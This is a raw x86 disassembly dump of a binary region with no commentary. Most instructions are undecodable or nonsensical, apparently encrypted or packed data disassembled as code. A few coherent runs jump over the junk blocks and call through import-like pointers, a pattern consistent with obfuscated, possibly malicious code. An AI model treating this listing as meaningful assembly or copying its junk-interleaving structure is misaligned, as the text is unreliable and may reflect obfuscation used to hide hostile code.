  40e063:	out    0x6e,al
  40e065:	mov    edi,0xf979a702
  40e06a:	and    eax,0xa355093d
  40e06f:	stos   DWORD PTR es:[edi],eax
  40e070:	ror    DWORD PTR [esi+0x4],1
  40e073:	icebp  
  40e074:	dec    BYTE PTR [eax-0x2d]
  40e077:	and    DWORD PTR [edi],ecx
  40e079:	mov    ebp,0x9d38a039
  40e07e:	aam    0x70
  40e080:	scas   eax,DWORD PTR es:[edi]
  40e081:	aam    0x1b
  40e083:	adc    al,0xeb
  40e085:	add    BYTE PTR [edx+0x8],ch
  40e088:	ins    DWORD PTR es:[edi],dx
  40e089:	xor    al,0x3e
  40e08b:	add    BYTE PTR [eax-0x7a],bl
  40e08e:	dec    edi
  40e08f:	sbb    eax,0x8c14807b
  40e094:	dec    edx
  40e095:	jo     0x40e0ba
  40e097:	clc    
  40e098:	je     0x40e038
  40e09a:	push   ebx
  40e09b:	fnstenv [ebx+0x1]
  40e09e:	dec    ebp
  40e09f:	cmp    BYTE PTR [ecx-0x4c78efff],bh
  40e0a5:	adc    al,0xe3
  40e0a7:	(bad)  
  40e0a9:	push   esp
  40e0aa:	repz sub al,0x43
  40e0ad:	mov    esp,0xdc4d8ba9
  40e0b2:	add    eax,0xfa0
  40e0b7:	xor    edx,edx
  40e0b9:	div    ecx
  40e0bb:	mov    ecx,DWORD PTR [ebp-0x20]
  40e0be:	xor    DWORD PTR ds:0x43354c,0x332a
  40e0c8:	or     eax,ecx
  40e0ca:	not    ecx
  40e0cc:	jmp    0x40e1a8
  40e0d1:	outs   dx,BYTE PTR ds:[esi]
  40e0d2:	inc    edx
  40e0d3:	and    BYTE PTR [ebx],bh
  40e0d5:	sub    al,0x7b
  40e0d7:	jg     0x40e130
  40e0d9:	shl    DWORD PTR [ebp-0x2f],cl
  40e0dc:	add    bh,BYTE PTR [eax-0x1d6de3bc]
  40e0e2:	xchg   ebp,eax
  40e0e3:	add    BYTE PTR [eax],al
  40e0e5:	mov    edi,0xb1000000
  40e0ea:	and    eax,0x992d8f
  40e0ef:	xor    DWORD PTR [ecx],0x1f
  40e0f2:	in     al,0xef
  40e0f4:	pop    ebp
  40e0f5:	jmp    0x54fa696d
  40e0fa:	adc    cl,bl
  40e0fc:	adc    BYTE PTR [eax-0x6005d79c],0xf1
  40e103:	clc    
  40e104:	bound  esp,QWORD PTR gs:[ebx+ebp*8-0x2eb16b3b]
  40e10c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e10d:	pop    es
  40e10e:	fxch   st(6)
  40e110:	mov    eax,ds:0xb4a205d2
  40e115:	mov    al,ds:0x6e9cbbc6
  40e11a:	and    DWORD PTR [ebp-0xa5ff5e5],edi
  40e120:	out    dx,al
  40e121:	dec    ebp
  40e122:	retf   
  40e123:	into   
  40e124:	mov    bh,0x27
  40e126:	mov    DWORD PTR [edi+0x51],0xcb485c79
  40e12d:	dec    ebx
  40e12e:	mov    gs,esi
  40e130:	cli    
  40e131:	sbb    esi,edx
  40e133:	fdivr  DWORD PTR [ebx-0x1d]
  40e136:	gs xchg edi,eax
  40e138:	add    ah,BYTE PTR [edx]
  40e13a:	add    bl,cl
  40e13c:	imul   edx,DWORD PTR [edi+0xbba220c],0xffffffd0
  40e143:	adc    DWORD PTR [esi+esi*8],ebx
  40e146:	mov    bh,0x20
  40e148:	mov    ebx,ss
  40e14a:	push   edi
  40e14b:	(bad)  
  40e14c:	fisubr WORD PTR [edi-0x48]
  40e14f:	cmp    cl,BYTE PTR [edi+0x4996504c]
  40e155:	test   al,0x39
  40e157:	push   ebp
  40e158:	add    al,0xce
  40e15a:	adc    DWORD PTR [ebp+0x3511d9fb],ebp
  40e160:	cwde   
  40e161:	rcl    BYTE PTR [eax+0x59],1
  40e164:	push   ecx
  40e165:	popf   
  40e166:	xchg   DWORD PTR ss:[esi],edx
  40e169:	push   eax
  40e16a:	stos   DWORD PTR es:[edi],eax
  40e16b:	shl    edi,cl
  40e16d:	call   0xdac:0xd191213d
  40e174:	inc    eax
  40e175:	jbe    0x40e13f
  40e177:	aam    0x68
  40e179:	not    BYTE PTR [edi-0x3e]
  40e17c:	sub    BYTE PTR [bp-0x6835],ch
  40e181:	in     al,dx
  40e182:	jecxz  0x40e12e
  40e184:	adc    bh,ch
  40e186:	xor    BYTE PTR [esi],ah
  40e188:	stc    
  40e189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e18a:	xchg   ebx,eax
  40e18b:	into   
  40e18c:	in     al,0xcd
  40e18e:	mov    bh,0x4f
  40e190:	pop    esp
  40e191:	xchg   ecx,eax
  40e192:	cli    
  40e193:	or     al,0x64
  40e195:	addr16 pop ss
  40e197:	(bad)  
  40e198:	jmp    0xa03:0xd88a920f
  40e19f:	push   esp
  40e1a0:	mov    dh,0xdb
  40e1a2:	rcr    DWORD PTR [edx-0x1a],0x59
  40e1a6:	mov    DWORD PTR [edi+0x35],eax
  40e1a9:	out    dx,eax
  40e1aa:	ins    BYTE PTR es:[edi],dx
  40e1ab:	add    BYTE PTR [eax],al
  40e1ad:	sub    ecx,DWORD PTR ds:0x433610
  40e1b3:	mov    DWORD PTR [ebp-0x1c],eax
  40e1b6:	and    eax,0x5f96
  40e1bb:	jmp    0x40e297
  40e1c0:	mov    bh,ch
  40e1c2:	mov    cl,0xc3
  40e1c4:	test   edi,0xe8f2fdfa
  40e1ca:	push   ecx
  40e1cb:	dec    esi
  40e1cc:	dec    edx
  40e1cd:	fild   DWORD PTR [esp+ebx*1-0x5f]
  40e1d1:	xchg   esi,eax
  40e1d2:	add    BYTE PTR [eax],al
  40e1d4:	mov    edi,0x9f000000
  40e1d9:	inc    edx
  40e1da:	retf   
  40e1db:	out    0xa0,al
  40e1dd:	push   cs
  40e1de:	lea    edx,[edi]
  40e1e0:	push   es
  40e1e1:	mov    esi,0xfa2449c8
  40e1e6:	push   ss
  40e1e7:	jns    0x40e1b3
  40e1e9:	jg     0x40e1df
  40e1eb:	rcr    esp,1
  40e1ed:	jle    0x40e1dd
  40e1ef:	call   DWORD PTR [ebx*1+0x57235f14]
  40e1f6:	ret    
  40e1f7:	call   0xcb1c3dec
  40e1fc:	es push ss
  40e1fe:	xchg   BYTE PTR [ebp+0x762a60a6],bh
  40e204:	test   eax,0x4ae7d0e0
  40e209:	retf   
  40e20a:	push   ebx
  40e20b:	retf   
  40e20c:	daa    
  40e20d:	out    dx,eax
  40e20e:	and    eax,0x16d89d29
  40e213:	dec    edx
  40e214:	dec    ecx
  40e215:	push   ecx
  40e216:	daa    
  40e217:	lds    ecx,FWORD PTR [esp+eax*8]
  40e21a:	and    edx,DWORD PTR ds:0x1f906c1a
  40e220:	add    al,0x57
  40e222:	and    al,0x55
  40e224:	and    bp,bp
  40e227:	xchg   ebp,eax
  40e228:	pop    ds
  40e229:	pop    edi
  40e22a:	dec    ebp
  40e22b:	js     0x40e248
  40e22d:	dec    ecx
  40e22e:	pop    ebx
  40e22f:	ja     0x40e1bb
  40e231:	xchg   esp,eax
  40e232:	cld    
  40e233:	dec    eax
  40e234:	into   
  40e235:	inc    edi
  40e236:	mul    BYTE PTR [ebp+eax*8+0x66663ee3]
  40e23d:	in     eax,0xee
  40e23f:	push   edx
  40e240:	pop    ds
  40e241:	in     al,0x4e
  40e243:	add    al,0x59
  40e245:	rol    DWORD PTR [ebp-0x70c5b584],cl
  40e24b:	dec    esi
  40e24c:	outs   dx,DWORD PTR ds:[esi]
  40e24d:	test   eax,0xd04940a1
  40e252:	enter  0x733a,0x47
  40e256:	and    eax,0xd3405d63
  40e25b:	adc    eax,0x3475f643
  40e260:	retf   
  40e261:	stos   DWORD PTR es:[edi],eax
  40e262:	enter  0xc0b4,0xd
  40e266:	into   
  40e267:	cmp    dl,BYTE PTR [edx+eiz*2+0x40]
  40e26b:	add    eax,0xd49ad224
  40e270:	mov    ecx,0xe4ab8542
  40e275:	pop    edx
  40e276:	mov    ebp,0xaf9e947
  40e27b:	mov    eax,0x3b44f59c
  40e280:	pop    edi
  40e281:	jne    0x40e25d
  40e283:	jne    0x40e28b
  40e285:	das    
  40e286:	inc    esp
  40e287:	xchg   ebp,eax
  40e288:	es mov edi,0x4b059399
  40e28e:	dec    ebp
  40e28f:	push   ebx
  40e290:	sub    eax,0xf325251a
  40e295:	mov    ss,WORD PTR [edi-0x5027ba39]
  40e29b:	push   es
  40e29c:	add    BYTE PTR [eax],al
  40e29e:	cmp    DWORD PTR ds:0x4335b0,0x0
  40e2a5:	jle    0x40e39d
  40e2ab:	or     eax,DWORD PTR ds:0x433630
  40e2b1:	jmp    0x40e39d
  40e2b6:	push   0x3809
  40e2bb:	call   DWORD PTR ds:0x43c7d0
  40e2c1:	jmp    0x40e39d
  40e2c6:	cmp    BYTE PTR [edx],ah
  40e2c8:	sub    DWORD PTR [ebx+ebx*4-0x749c251],0x702b28a
  40e2d3:	ins    DWORD PTR es:[edi],dx
  40e2d4:	in     al,0x2
  40e2d6:	pusha  
  40e2d7:	xchg   edi,eax
  40e2d8:	add    BYTE PTR [eax],al
  40e2da:	mov    edi,0x95000000
  40e2df:	fldenv [esi-0x9]
  40e2e2:	pop    ds
  40e2e3:	and    eax,0xde499d73
  40e2e8:	stos   BYTE PTR es:[edi],al
  40e2e9:	or     al,0xc0
  40e2eb:	loop   0x40e281
  40e2ed:	push   edi
  40e2ee:	adc    bl,BYTE PTR [ebx]
  40e2f0:	out    0x43,al
  40e2f2:	stos   BYTE PTR es:[edi],al
  40e2f3:	dec    ebp
  40e2f4:	jmp    0xd1b9:0x9121e41d
  40e2fb:	ja     0x40e2e5
  40e2fd:	adc    al,0x27
  40e2ff:	(bad)  
  40e300:	adc    al,0x3d
  40e302:	push   0x8
  40e304:	and    edi,edx
  40e306:	jns    0x40e2da
  40e308:	out    0x28,eax
  40e30a:	sar    DWORD PTR [ebx-0x63c0f854],1
  40e310:	addr16 fsubr st,st(7)
  40e313:	or     al,0x11
  40e315:	scas   al,BYTE PTR es:[edi]
  40e316:	push   ebx
  40e317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e318:	leave  
  40e319:	and    DWORD PTR [eax],0xffffffc8
  40e31c:	fwait
  40e31d:	dec    ecx
  40e31e:	stos   DWORD PTR es:[edi],eax
  40e31f:	and    dh,al
  40e321:	add    DWORD PTR [ebp+0x7],0xa8f21242
  40e328:	jg     0x40e2ae
  40e32a:	sbb    edx,edi
  40e32c:	mov    al,ds:0xcc79b49a
  40e331:	and    al,0x58
  40e333:	arpl   WORD PTR [eax+0x66],bp
  40e336:	pop    es
  40e337:	pop    ebx
  40e338:	push   edx
  40e339:	adc    eax,0xaeec2acd
  40e33e:	mov    dh,0x4b
  40e340:	loop   0x40e337
  40e342:	out    dx,al
  40e343:	mov    ah,0xfa
  40e345:	sbb    eax,0xf09350fc
  40e34a:	cmp    bh,0x30
  40e34d:	mov    esp,0x66a9969
  40e352:	inc    esp
  40e353:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e355:	adc    BYTE PTR [esi],ah
  40e357:	sub    esp,DWORD PTR [edx-0x69]
  40e35a:	je     0x40e378
  40e35c:	fwait
  40e35d:	mov    ecx,DWORD PTR [esi-0x27e9526e]
  40e363:	xor    DWORD PTR [edi*4+0x6a061f02],ecx
  40e36a:	or     eax,0x31e6ce2c
  40e36f:	push   es
  40e370:	adc    BYTE PTR [eax-0x7e83774a],dl
  40e376:	nop
  40e377:	lods   eax,DWORD PTR ds:[esi]
  40e378:	push   ss
  40e379:	adc    al,0x26
  40e37b:	xor    BYTE PTR [esi+0x77],ch
  40e37e:	push   edi
  40e37f:	arpl   WORD PTR [ecx-0x3dfd250b],si
  40e385:	outs   dx,BYTE PTR ds:[esi]
  40e386:	pop    edx
  40e387:	(bad)  
  40e388:	push   ds
  40e389:	clc    
  40e38a:	mov    ds:0xcb212375,eax
  40e38f:	adc    eax,DWORD PTR [ebp+0x4acc54f3]
  40e395:	pop    edi
  40e396:	xchg   esi,eax
  40e397:	aaa    
  40e398:	repnz xchg ebp,eax
  40e39a:	pop    edx
  40e39b:	fidiv  WORD PTR [edi]
  40e39d:	mov    eax,DWORD PTR [ebp-0x28]
  40e3a0:	jmp    0x40e47c
  40e3a5:	nop
  40e3a6:	jno    0x40e41b
  40e3a8:	xlat   BYTE PTR ds:[ebx]
  40e3a9:	repz xlat BYTE PTR ds:[ebx]
  40e3ab:	mov    ah,0x77
  40e3ad:	jns    0x40e3d7
  40e3af:	inc    esi
  40e3b0:	in     al,0x79
  40e3b2:	xcrypt-ctr (bad)
  40e3b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3b4:	lahf   
  40e3b5:	pop    ds
  40e3b6:	cwde   
  40e3b7:	add    BYTE PTR [eax],al
  40e3b9:	mov    edi,0x1d000000
  40e3be:	test   BYTE PTR [esp+ebp*2+0x157d9dae],0xe6
  40e3c6:	push   ds
  40e3c7:	add    al,0xd8
  40e3c9:	dec    edx
  40e3ca:	pop    ecx
  40e3cb:	cmp    esi,DWORD PTR [ebx+0x46]
  40e3ce:	les    esi,FWORD PTR [eax]
  40e3d0:	ror    eax,0xe8
  40e3d3:	cmp    bl,BYTE PTR [ebp+0x72]
  40e3d6:	mov    dl,0x68
  40e3d8:	sbb    DWORD PTR [esi+0x1f],0x57d793b4
  40e3df:	pop    esi
  40e3e0:	mov    eax,ds:0x239c1846
  40e3e5:	int    0x16
  40e3e7:	ror    DWORD PTR es:[esi],1
  40e3ea:	adc    cl,dh
  40e3ec:	xchg   ebx,eax
  40e3ed:	and    DWORD PTR [edi+0x42312353],edi
  40e3f3:	outs   dx,BYTE PTR ds:[esi]
  40e3f4:	adc    BYTE PTR [esi-0x6b239911],bh
  40e3fa:	jge    0x40e3e4
  40e3fc:	popf   
  40e3fd:	lods   al,BYTE PTR ds:[esi]
  40e3fe:	lahf   
  40e3ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e400:	xchg   esp,eax
  40e401:	iret   
  40e402:	ins    BYTE PTR es:[edi],dx
  40e403:	loope  0x40e47d
  40e405:	mov    bh,BYTE PTR [edi+0x29]
  40e408:	fild   QWORD PTR [ebp-0x31873d6a]
  40e40e:	nop
  40e40f:	adc    DWORD PTR [esi+0x62],eax
  40e412:	shl    DWORD PTR [ebx+0x4e],cl
  40e415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e416:	jns    0x40e404
  40e418:	mov    ch,0x53
  40e41a:	sar    BYTE PTR cs:[ecx+0x5f091146],cl
  40e421:	pushf  
  40e422:	mov    bh,dl
  40e424:	pop    esp
  40e425:	xor    BYTE PTR [ebp+0x401dd257],dl
  40e42b:	adc    ebx,esi
  40e42d:	add    DWORD PTR [ecx+0x43537669],edx
  40e433:	aad    0x2e
  40e435:	dec    edi
  40e436:	clc    
  40e437:	stos   BYTE PTR es:[edi],al
  40e438:	and    DWORD PTR [ebp-0x33],0x6c
  40e43c:	mov    dl,0x4a
  40e43e:	jmp    0xceb270e0
  40e443:	(bad)  
  40e445:	ja     0x40e487
  40e447:	jns    0x40e445
  40e449:	inc    ebp
  40e44a:	iret   
  40e44b:	sti    
  40e44c:	xchg   ebx,eax
  40e44d:	(bad)  
  40e44e:	mov    ch,0x76
  40e450:	aad    0x8f
  40e452:	daa    
  40e453:	inc    esp
  40e454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e455:	push   edi
  40e456:	(bad)  
  40e458:	push   esp
  40e459:	aam    0xf6
  40e45b:	pushf  
  40e45c:	xlat   BYTE PTR ds:[ebx]
  40e45d:	loopne 0x40e4ae
  40e45f:	dec    ebx
  40e460:	fidivr WORD PTR [ebx-0x23c23ac9]
  40e466:	int3   
  40e467:	push   ebp
  40e468:	push   cs
  40e469:	shl    BYTE PTR fs:[ebx-0x29],0xe1
  40e46e:	stos   BYTE PTR es:[edi],al
  40e46f:	push   ecx
  40e470:	add    esi,DWORD PTR [ebp-0x135ce69b]
  40e476:	out    0x78,al
  40e478:	ins    DWORD PTR es:[edi],dx
  40e479:	aad    0x70
  40e47b:	dec    edx
  40e47c:	sub    eax,0x1239
  40e481:	jmp    0x40e55d
  40e486:	cld    
  40e487:	retf   
  40e488:	mov    ds,WORD PTR [ecx]
  40e48a:	mov    edi,0x4defff5d
  40e48f:	loop   0x40e424
  40e491:	int    0x6a
  40e493:	retf   0xcda7
  40e496:	ficomp WORD PTR [eax+0xbf0000]
  40e49c:	add    BYTE PTR [eax],al
  40e49e:	cmp    al,0xe8
  40e4a0:	add    eax,0xeea7cd0b
  40e4a5:	cwde   
  40e4a6:	sub    ah,BYTE PTR [eax]
  40e4a8:	(bad)  
  40e4a9:	retf   0x1dc9
  40e4ac:	jbe    0x40e490
  40e4ae:	sbb    eax,0xf691bb8a
  40e4b3:	xchg   DWORD PTR [edx+0x30],ebx
  40e4b6:	out    0x84,eax
  40e4b8:	inc    esp
  40e4b9:	jae    0x40e47f
  40e4bb:	sbb    DWORD PTR [ecx+ebx*2-0x72634c68],eax
  40e4c2:	xlat   BYTE PTR ds:[ebx]
  40e4c3:	div    esi
  40e4c5:	fwait
  40e4c6:	scas   al,BYTE PTR es:[edi]
  40e4c7:	ret    
  40e4c8:	inc    ebp
  40e4c9:	or     dh,BYTE PTR [edi-0x5d]
  40e4cc:	sahf   
  40e4cd:	imul   ebp,DWORD PTR [edi+0x7b],0xda410f52
  40e4d4:	mov    dl,0xe6
  40e4d6:	in     eax,dx
  40e4d7:	fldenv [eax+0x60]
  40e4da:	dec    ebx
  40e4db:	push   cs
  40e4dc:	popf   
  40e4dd:	jne    0x40e471
  40e4df:	fistp  QWORD PTR [esi+0x71]
  40e4e2:	ds daa 
  40e4e4:	and    DWORD PTR [edx+0x4e],ebp
  40e4e7:	ins    BYTE PTR es:[edi],dx
  40e4e8:	push   edi
  40e4e9:	push   esp
  40e4eb:	or     al,bl
  40e4ed:	aad    0xf0
  40e4ef:	xor    dh,BYTE PTR [ebp+0x21]
  40e4f2:	jmp    0xbeab2a65
  40e4f7:	adc    eax,0x8ecfbf72
  40e4fc:	jmp    0x7033a834
  40e501:	xor    ebp,ebx
  40e503:	mov    eax,0x51ea9126
  40e508:	sbb    al,0x31
  40e50a:	not    BYTE PTR [eax]
  40e50c:	fs fs mov cl,0x37
  40e510:	scas   eax,DWORD PTR es:[edi]
  40e511:	ret    0xef7c
  40e514:	sub    al,0x78
  40e516:	dec    edi
  40e517:	loopne 0x40e4d0
  40e519:	adc    bh,BYTE PTR [edi-0x54f51f02]
  40e51f:	not    BYTE PTR ds:0xe6ae6c9d
  40e525:	mov    ebx,0x50103c07
  40e52a:	shl    BYTE PTR [eax-0x55],1
  40e52d:	inc    ebp
  40e52e:	jnp    0x40e572
  40e530:	repz xchg ecx,eax
  40e532:	jbe    0x40e52f
  40e534:	cmp    BYTE PTR [esi],dh
  40e536:	out    dx,al
  40e537:	pop    ebp
  40e538:	out    0x62,eax
  40e53a:	xchg   ebp,eax
  40e53b:	inc    esi
  40e53c:	pop    ds
  40e53d:	(bad)  
  40e53e:	stos   BYTE PTR es:[edi],al
  40e53f:	fadd   QWORD PTR [ebp-0x2d]
  40e542:	xor    BYTE PTR [eax+0x79],dh
  40e545:	jmp    0x1d80b260
  40e54a:	hlt    
  40e54b:	sub    al,0x4
  40e54d:	lea    esp,[edi]
  40e54f:	inc    edx
  40e550:	fadd   DWORD PTR [eax+0x2540fedb]
  40e556:	push   ecx
  40e557:	test   eax,0x84482c61
  40e55c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e55d:	and    eax,0x3b96
  40e562:	sub    eax,0x3016
  40e567:	mov    DWORD PTR [ebp-0x24],eax
  40e56a:	mov    DWORD PTR [ebp-0x24],0xd2b
  40e571:	neg    eax
  40e573:	mov    DWORD PTR [ebp-0x28],0x55cd
  40e57a:	or     DWORD PTR ds:0x433614,ecx
  40e580:	mov    eax,DWORD PTR [ebp-0x28]
  40e583:	cmp    DWORD PTR ds:0x43353c,0x0
  40e58a:	jbe    0x40e5b8
  40e590:	sub    DWORD PTR ds:0x43366c,0x43362c
  40e59a:	and    ecx,DWORD PTR ds:0x433648
  40e5a0:	jmp    0x40e5b8
  40e5a5:	push   0x2a50
  40e5aa:	push   DWORD PTR [ebp-0x1c]
  40e5ad:	push   0x786e
  40e5b2:	call   DWORD PTR ds:0x43c82c
  40e5b8:	mov    ecx,DWORD PTR [ebp-0x24]
  40e5bb:	xor    eax,0x4887
  40e5c0:	add    eax,0x1b29
  40e5c5:	imul   eax,eax,0x5a4
  40e5cb:	or     eax,ecx
  40e5cd:	sub    ecx,DWORD PTR ds:0x433560
  40e5d3:	jmp    0x40e6af
  40e5d8:	sub    al,0x27
  40e5da:	add    eax,0xacaf0f8d
  40e5df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5e0:	pop    edi
  40e5e1:	test   BYTE PTR [esi+ecx*2-0x18],0x32
  40e5e6:	add    BYTE PTR [ebx],dh
  40e5e8:	popf   
  40e5e9:	cdq    
  40e5ea:	add    BYTE PTR [eax],al
  40e5ec:	mov    edi,0x99000000
  40e5f1:	enter  0xa40a,0x27
  40e5f5:	ja     0x40e5be
  40e5f7:	in     eax,dx
  40e5f8:	imul   ecx,ebp,0x39
  40e5fb:	dec    edx
  40e5fc:	xlat   BYTE PTR ds:[ebx]
  40e5fd:	jg     0x40e60c
  40e5ff:	js     0x40e598
  40e601:	sub    eax,0x23747063
  40e606:	nop
  40e607:	mov    edi,0xcc2010df
  40e60c:	or     esp,DWORD PTR [edi]
  40e60e:	add    DWORD PTR [ecx],edx
  40e610:	ror    BYTE PTR [ecx-0x1f815fe0],1
  40e616:	mov    ebx,0x5db8b584
  40e61b:	add    eax,0x77d6d4e1
  40e620:	jg     0x40e66a
  40e622:	push   eax
  40e623:	cli    
  40e624:	ret    
  40e625:	add    bl,ch
  40e627:	sub    esi,DWORD PTR [ebx+0x7bd7cfed]
  40e62d:	les    edi,FWORD PTR [edi-0xe]
  40e630:	test   DWORD PTR [edi],ebx
  40e632:	adc    bh,BYTE PTR ds:0xc31e4d05
  40e638:	sbb    al,0xcc
  40e63a:	gs loope 0x40e60a
  40e63d:	sar    DWORD PTR [edi+0x5e1f5f3e],0xb8
  40e644:	inc    ecx
  40e645:	dec    ebp
  40e646:	sahf   
  40e647:	mov    bl,BYTE PTR [edi+0x8]
  40e64a:	pop    ss
  40e64b:	cmp    DWORD PTR [edi],ebp
  40e64d:	jo     0x40e619
  40e64f:	aaa    
  40e650:	dec    esi
  40e651:	call   0xccdd:0x73524517
  40e658:	adc    dh,al
  40e65a:	imul   esi,DWORD PTR [ebx+0x63],0xfffffff3
  40e65e:	push   0xfffffffa
  40e660:	mov    al,0xe7
  40e662:	mov    dl,0xdf
  40e664:	and    DWORD PTR [ecx-0x2a],edi
  40e667:	mov    cl,0x35
  40e669:	xchg   ecx,eax
  40e66a:	cmp    DWORD PTR ds:0xe5a83367,eax
  40e670:	popa   
  40e671:	push   edi
  40e672:	sahf   
  40e673:	cmp    ebp,ebp
  40e675:	sti    
  40e676:	xchg   edi,eax
  40e677:	mov    ch,BYTE PTR [ebx+0x1417329b]
  40e67d:	push   esi
  40e67e:	not    BYTE PTR [esi+edi*2]
  40e681:	and    edi,edi
  40e683:	mov    ebx,0xd04a4d33
  40e688:	dec    edi
  40e689:	sbb    bh,cl
  40e68b:	ja     0x40e6be
  40e68d:	push   ss
  40e68e:	pop    ss
  40e68f:	out    dx,al
  40e690:	mov    eax,edx
  40e692:	push   esp
  40e693:	in     al,0x5a
  40e695:	daa    
  40e696:	ins    DWORD PTR es:[edi],dx
  40e697:	ins    BYTE PTR es:[edi],dx
  40e698:	mov    ecx,0xcd3ad390
  40e69d:	fmul   DWORD PTR [ecx+0x34]
  40e6a0:	stos   DWORD PTR es:[edi],eax
  40e6a1:	sbb    DWORD PTR [ebx+ebp*1+0x23bfe768],0xffffffcb
  40e6a9:	into   
  40e6aa:	(bad)  
  40e6ab:	stc    
  40e6ac:	mov    bh,BYTE PTR [edx]
  40e6ae:	shr    BYTE PTR ds:0x13e6daf,cl
  40e6b4:	adc    DWORD PTR ds:0x4335bc,0x74a5
  40e6be:	jmp    0x40e79a
  40e6c3:	js     0x40e738
  40e6c5:	mov    dh,0x4
  40e6c7:	mov    edi,0x7ffac5
  40e6cc:	push   es
  40e6cd:	xchg   ebp,eax
  40e6ce:	mov    eax,ds:0x380ec84f
  40e6d3:	pop    esp
  40e6d4:	call   0x0:0xbf0000
  40e6db:	or     ebp,DWORD PTR [ebx-0x49]
  40e6de:	adc    al,0xb6
  40e6e0:	xlat   BYTE PTR ds:[ebx]
  40e6e1:	adc    esi,ecx
  40e6e3:	stc    
  40e6e4:	ins    DWORD PTR es:[edi],dx
  40e6e5:	popa   
  40e6e6:	sbb    BYTE PTR [ebp+0x74],0xed
  40e6ea:	loop   0x40e6df
  40e6ec:	test   al,0x95
  40e6ee:	xor    eax,0x523eeef3
  40e6f3:	pop    es
  40e6f4:	push   ecx
  40e6f5:	into   
  40e6f6:	jge    0x40e71b
  40e6f8:	pop    ebp
  40e6f9:	fisttp DWORD PTR [edi+0x5ece98f4]
  40e6ff:	jae    0x40e6a1
  40e701:	aaa    
  40e702:	or     al,0xd5
  40e704:	retf   0xa531
  40e707:	fsub   DWORD PTR [edx-0x39f94c67]
  40e70d:	stos   BYTE PTR es:[edi],al
  40e70e:	fimul  DWORD PTR [ebx+0x184d5d1f]
  40e714:	pop    ecx
  40e715:	fisttp QWORD PTR [ecx+0x27889f62]
  40e71b:	push   esi
  40e71c:	sbb    esp,DWORD PTR [eax]
  40e71e:	neg    DWORD PTR [edi-0x4ddc4037]
  40e724:	outs   dx,DWORD PTR ds:[esi]
  40e725:	psubw  mm0,QWORD PTR [eax-0x213d0296]
  40e72c:	xor    eax,0xdfaab2ed
  40e731:	cmp    BYTE PTR [ecx-0x4a88409f],0xaf
  40e738:	adc    DWORD PTR [eax-0x38],edi
  40e73b:	jg     0x40e6e4
  40e73d:	sub    eax,0xc7fa7ab9
  40e742:	iret   
  40e743:	mov    WORD PTR [ebx-0x540ff315],?
  40e749:	add    eax,0x23b13574
  40e74e:	fwait
  40e74f:	cmp    bh,bl
  40e751:	inc    ebp
  40e752:	daa    
  40e753:	xor    al,0xb7
  40e755:	jge    0x40e6ee
  40e757:	aad    0xfc
  40e759:	ja     0x40e76d
  40e75b:	pop    ds
  40e75c:	ds or  ebp,edi
  40e75f:	imul   esi,DWORD PTR [esi],0xffffffaa
  40e762:	pop    es
  40e763:	xchg   esi,eax
  40e764:	es inc ebx
  40e766:	cmp    DWORD PTR [ecx-0x4b2754d8],esp
  40e76c:	and    esp,DWORD PTR [ecx+eax*2-0x19]
  40e770:	jno    0x40e71a
  40e772:	xor    al,0x87
  40e774:	dec    ebp
  40e775:	xor    al,0xe1
  40e777:	stos   BYTE PTR es:[edi],al
  40e778:	or     BYTE PTR [esi],ch
  40e77a:	retf   
  40e77b:	inc    ecx
  40e77c:	fcmove st,st(4)
  40e77e:	call   0x420a:0x808256c6
  40e785:	cmp    al,0xd6
  40e787:	sub    eax,0x7f03a125
  40e78c:	retf   0xefd9
  40e78f:	dec    eax
  40e790:	popf   
  40e791:	shr    DWORD PTR [esi-0x27b07af7],1
  40e797:	inc    esp
  40e798:	push   edi
  40e799:	xor    al,0x89
  40e79b:	inc    ebp
  40e79c:	fsub   DWORD PTR [ecx+0x433608]
  40e7a2:	xor    DWORD PTR ds:0x4335e8,eax
  40e7a8:	mov    DWORD PTR [ebp-0x1c],0x7fa3
  40e7af:	mov    DWORD PTR [ebp-0x20],0x705c
  40e7b6:	jmp    0x40e892
  40e7bb:	push   ebx
  40e7bc:	cmc    
  40e7bd:	aaa    
  40e7be:	fidiv  WORD PTR [edi+0x2bfdfbde]
  40e7c4:	cmp    bh,ch
  40e7c6:	imul   edi,DWORD PTR ds:0x1b4ea9b2,0xbf00009b
  40e7d0:	add    BYTE PTR [eax],al
  40e7d2:	add    cl,bl
  40e7d4:	in     eax,dx
  40e7d5:	aam    0x61
  40e7d7:	mov    DWORD PTR [ebx],esp
  40e7d9:	sub    esp,esi
  40e7db:	cmp    esi,eax
  40e7dd:	dec    esi
  40e7de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7df:	js     0x40e76a
  40e7e1:	dec    edx
  40e7e2:	shl    ch,1
  40e7e4:	jmp    0x40e7f9
  40e7e6:	fwait
  40e7e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7e8:	popa   
  40e7e9:	rcr    DWORD PTR [ebp+0x7a],1
  40e7ec:	and    DWORD PTR [ecx],eax
  40e7ee:	xor    DWORD PTR [ecx+edi*4+0x4e98d37c],ecx
  40e7f5:	icebp  
  40e7f6:	xchg   esp,eax
  40e7f7:	mov    esp,0x3c21f4e0
  40e7fc:	scas   eax,DWORD PTR es:[edi]
  40e7fd:	es in  al,0xa8
  40e800:	sbb    edi,0xffffffa3
  40e803:	data16 (bad) 
  40e805:	pushf  
  40e806:	cmp    ch,BYTE PTR [edx]
  40e808:	inc    edi
  40e809:	xchg   esp,eax
  40e80a:	jno    0x40e87f
  40e80c:	fdivr  QWORD PTR [ebx+ebx*1]
  40e80f:	xor    DWORD PTR [eax+0x24],esp
  40e812:	cmp    ecx,edi
  40e814:	aad    0xd6
  40e816:	retf   
  40e817:	pop    edx
  40e818:	dec    ebx
  40e819:	cmp    esi,DWORD PTR [ebp+0x4db71c84]
  40e81f:	mov    BYTE PTR [esi-0x482f596a],dh
  40e825:	adc    al,0xf1
  40e827:	loopne 0x40e808
  40e829:	sbb    edi,DWORD PTR [eax+0x4b5f9dd]
